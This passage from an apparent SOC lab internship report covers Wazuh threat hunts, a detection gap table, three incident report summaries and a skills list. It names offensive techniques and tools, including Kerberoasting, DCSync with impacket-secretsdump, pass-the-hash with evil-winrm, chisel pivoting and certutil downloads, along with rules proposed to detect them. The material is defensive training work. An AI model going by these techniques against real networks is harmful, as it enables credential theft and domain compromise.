**Result:** Hits found from the Use Case 3 Kerberoasting phase, demonstrating that the raw data exists in Wazuh even though no correlation rule turns it into a first-class alert.

Full details in [`hunts/hunt-2-kerberoasting-tgs-requests/`](hunts/hunt-2-kerberoasting-tgs-requests/).

### 19.3 Hunt 3 — Domain Admins Group Changes

**Hypothesis:** any modification to Domain Admins group membership is high risk and worth investigation.

**Query:** `rule.description: "Domain Admins Group Changed" or data.win.system.eventID: "4728"`

**Result:** A hit was found from the Use Case 3 demonstration where hqSaacid was added to Domain Admins, confirming that Wazuh caught the change in real time.

Full details in [`hunts/hunt-3-domain-admins-group-changes/`](hunts/hunt-3-domain-admins-group-changes/).

### 19.4 Hunt 4 — Repeated Failed Logons in Short Window

**Hypothesis:** A high frequency of failed logon events from a single source in a short window is a strong indicator of automated brute force.

**Query:** `rule.id: "60122" or rule.id: "60104"`

**Result:** Multiple hits from Use Case 1, providing a clean signal of brute force activity even when correlation rules are not tuned yet.

Full details in [`hunts/hunt-4-repeated-failed-logons/`](hunts/hunt-4-repeated-failed-logons/).

## 20. Detection Gaps Identified

Honest documentation of detection gaps is as valuable as documentation of successful detections. Both drive the SOC engineering roadmap. The following gaps were identified during Month 2 and are recommended for future engineering work.

| Gap | Impact | Recommended Remediation |
|---|---|---|
| Kerberoasting not detected | Service accounts silently compromised | Custom rule for many unique SPN 4769 requests from single source in 60s |
| DCSync not detected | Full domain hash dump goes unnoticed | Custom rule for Event 4662 with DRSUAPI replication GUID |
| Chisel and SOCKS pivots not detected | Attacker C2 tunnels undetected | Sysmon Event 3 rules for long-lived outbound connections from user context |
| LOLBin usage not detected | File transfer via legitimate binary invisible | Sysmon Event 1 rule for certutil with urlcache flag |
| Anonymous SMB session not detected | Reconnaissance phase invisible | Custom rule for Event 5140 with ANONYMOUS LOGON user |
| Share name enumeration not detected | Rapid failed share connections not correlated | Custom rule for many failed share connections from single source |
| Intra-subnet port scan not detected | Same-subnet reconnaissance invisible to pfSense | Sysmon Event 3 on endpoints or Suricata network sensor |
| Pass-the-hash not distinguished from normal NTLM | Credential replay looks legitimate | Deploy Defender for Identity or similar AD attack detection |

## 21. Incident Reports

Three formal Incident Reports were produced documenting the Month 2 attack simulations. Each is delivered as a standalone document under [`incident-reports/`](incident-reports/) and summarized here.

### 21.1 IR-2026-001 — Brute Force Attack Against Domain Controller

Severity high, level 10. Status closed and contained by automated response. Source 10.10.10.60 targeting DC1. Detection was via rules 60104, 60205, and 60115. Response was Wazuh Active Response deploying a firewall block via netsh in under six seconds from the first failed authentication.

See [`incident-reports/IR-2026-001-brute-force.md`](incident-reports/IR-2026-001-brute-force.md).

### 21.2 IR-2026-002 — Anonymous SMB Share Data Exposure

Severity high, level 10. Status closed and contained post-remediation. Source 10.10.10.60 targeting HQ-STAFF-01. Detection was only post-authentication via rules 60106 and 92657. Root cause was anonymous SMB access combined with plaintext credentials stored inside the accessible share.

See [`incident-reports/IR-2026-002-anonymous-smb.md`](incident-reports/IR-2026-002-anonymous-smb.md).

### 21.3 IR-2026-003 — Domain Compromise via Kerberoasting and DCSync

Severity critical, level 15. Status closed with a full domain rebuild recommendation. Source 10.10.10.60 pivoting through HQ-STAFF-01 to reach DC1. Detection was limited to rule 92657 firing during NTLM authentication phases. Impact is total domain compromise with the krbtgt hash exposed, meaning all Kerberos tickets across the domain must be treated as potentially forged.

See [`incident-reports/IR-2026-003-kerberoast-dcsync.md`](incident-reports/IR-2026-003-kerberoast-dcsync.md).

## 22. Month 2 Skills and Technical Competencies Developed

### 22.1 Detection Engineering

- Windows advanced audit policy configuration via `auditpol`
- Wazuh custom decoder development using PCRE2 regular expressions
- Wazuh custom rule development with `same_srcip`, `frequency`, and `timeframe` correlation
- Log source onboarding for Windows EventChannel and pfSense syslog
- Threat intelligence enrichment via VirusTotal integration
- Dashboard and visualization engineering in OpenSearch Dashboards

### 22.2 Incident Response

- Automated containment via Wazuh Active Response
- End-to-end response chain validation from alert through agent execution to confirmation
- Formal incident reporting following industry structure
- Root cause analysis and remediation planning
- MITRE ATT&CK technique mapping

### 22.3 Offensive Security

- Kerberos attacks with `kerbrute` for user enumeration, password spray, and brute force
- SMB reconnaissance and lateral movement via `netexec`, `smbclient`, and impacket
- Kerberoasting via `impacket-GetUserSPNs` and offline cracking with `hashcat`
- DCSync attack via `impacket-secretsdump`
- Pass-the-hash authentication via `evil-winrm` with NT hash
- Network pivoting via `chisel` reverse SOCKS proxy and `proxychains`
- Living-off-the-Land binaries such as `certutil` for file download

### 22.4 Threat Hunting

- KQL query construction for OpenSearch
- Hypothesis-driven investigation methodology
- Detection gap identification and documentation

## 23. Month 2 Final Operational State

| Component | Status |
|---|---|
| VirusTotal Enrichment | Operational, validated with EICAR |
| Windows Audit Policies (DC1) | Fully enabled for Logon and Kerberos |
| Windows Audit Policies (HQ-STAFF-01) | Fully enabled for Logon |
| Security Channel Forwarding | Operational on both agents |
| Custom pfSense Decoder | Operational, validated via wazuh-logtest |
| Custom Rules 100300 and 100301 | Operational, port scan detection working |
| Active Response via netsh | Operational on both DC1 and HQ-STAFF-01 |
| Authentication Monitoring Dashboard | Deployed with three visualizations |
| Use Case 1 (Brute Force) | Detected and auto-contained |
| Use Case 2 (Lateral Movement) | Partially detected, see Section 20 |
| Use Case 3 (Domain Compromise) | Partially detected, see Section 20 |
| Detection Gaps Documented | Eight gaps identified with remediation plans |
| Incident Reports Produced | Three formal reports |

## 24. Closing Statement

Months 1 and 2 together represent a full-cycle security internship engagement. Month 1 established the enterprise infrastructure and the monitoring baseline that Month 2 depended on. Month 2 turned that baseline into an operational SOC, executing real attacks against real defenses, and produced the artifacts a mature security team is expected to deliver: custom detection engineering, three formal incident reports, a documented detection gap register, and a set of concrete remediation recommendations.

The work is honest about both successes and gaps. VirusTotal enrichment works. Brute force detection with automated containment works. pfSense port scan correlation via a custom decoder works. At the same time, Kerberoasting, DCSync, LOLBin usage, and pivoting through chisel were executed successfully by the red team without triggering meaningful alerts, and each of these gaps is documented with a concrete recommendation. This is deliberate: a mature SOC report identifies what its telemetry does not catch as much as what it does.

All exercises, configurations, and outcomes documented in this report are reproducible from the Lab Modifications inventory in Section 16.